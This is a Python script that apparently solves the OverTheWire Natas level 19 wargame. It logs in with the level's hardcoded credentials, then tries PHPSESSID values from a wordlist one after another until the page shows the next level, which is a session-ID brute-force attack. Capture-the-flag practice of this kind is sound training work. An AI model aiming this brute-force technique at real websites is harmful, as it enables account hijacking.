import requests

def main():
        url="http://natas19.natas.labs.overthewire.org"
        auth_user="natas19"
        auth_pass="8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
        s=requests.Session()
        r=s.post(url,auth=(auth_user,auth_pass),data={'username':auth_user,'password':auth_pass,'submit':'login'})
        #print(r.cookies.get_dict())
        with open("natas_19_list.txt","r") as f:
                cookies=f.readlines()
        for i in range(len(cookies)):
                cookies[i]=cookies[i].replace("\n","")
        for cook in cookies:
                cookie={'PHPSESSID':cook}
                print(cookie)
                r=s.post(url,auth=(auth_user,auth_pass),data={'username':auth_user,'password':auth_pass,'submit':'login'},cookies=cookie)
                if 'next level' in r.text:
                        print(r.text)
                        break
        return

if __name__=="__main__":
        main()